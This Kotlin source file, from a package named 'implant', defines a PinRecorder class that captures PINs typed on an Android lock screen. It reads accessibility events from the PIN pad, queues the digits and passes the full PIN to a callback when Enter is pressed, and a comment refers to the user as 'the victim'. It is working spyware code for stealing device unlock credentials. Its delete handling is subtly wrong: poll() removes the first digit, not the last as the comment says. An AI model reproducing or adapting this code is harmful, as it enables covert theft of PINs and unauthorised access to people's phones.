/*
* Records PINs entered on the lock screen.
* Since the PIN pad widgets are regular Buttons, an AccessibilityEvent with the text is sent.
* This class parses PINs from a stream of these AccessibilityEvents by reading adding events to a queue
* until the enter key is pressed.
* The contents of the queue at this point will be a PIN entered on the lockscreen, though not necessarily
* a correct PIN.
* */
package com.cooperthecoder.implant

import java.util.*

class PinRecorder(val callback: Callback) {

    private object PinPad {
        @JvmStatic val ONE = "[1]"
        @JvmStatic val TWO = "[ABC, 2]"
        @JvmStatic val THREE = "[DEF, 3]"
        @JvmStatic val FOUR = "[GHI, 4]"
        @JvmStatic val FIVE = "[JKL, 5]"
        @JvmStatic val SIX = "[MNO, 6]"
        @JvmStatic val SEVEN = "[PQRS, 7]"
        @JvmStatic val EIGHT = "[TUV, 8]"
        @JvmStatic val NINE = "[WXYZ, 9]"
        @JvmStatic val ZERO = "[0, +]"
        @JvmStatic val DELETE = "[Delete]"
        @JvmStatic val ENTER = "[Enter]"
        @JvmStatic val EMERGENCY = "[Emergency]"
    }

    private val digitQueue: Queue<String> = LinkedList<String>()

    fun appendPinDigit(digit: String) {
        when (digit) {
            PinPad.DELETE -> {
                // Remove the last digit logged if the user pressed delete.
                digitQueue.poll()
            }

            PinPad.ENTER -> {
                // When the victim presses enter, get ready for a new one.
                callback.onPinRecorded(digitQueue.joinToString("-"))
                clearPinQueue()
            }

            PinPad.EMERGENCY -> {
                // Ignore these
            }

            else -> {
                // Otherwise, add the digit to the digitQueue.
                digitQueue.add(digit)
            }

        }
    }

    fun clearPinQueue() {
        digitQueue.clear()
    }

    interface Callback {
        fun onPinRecorded(pin: String)
    }

}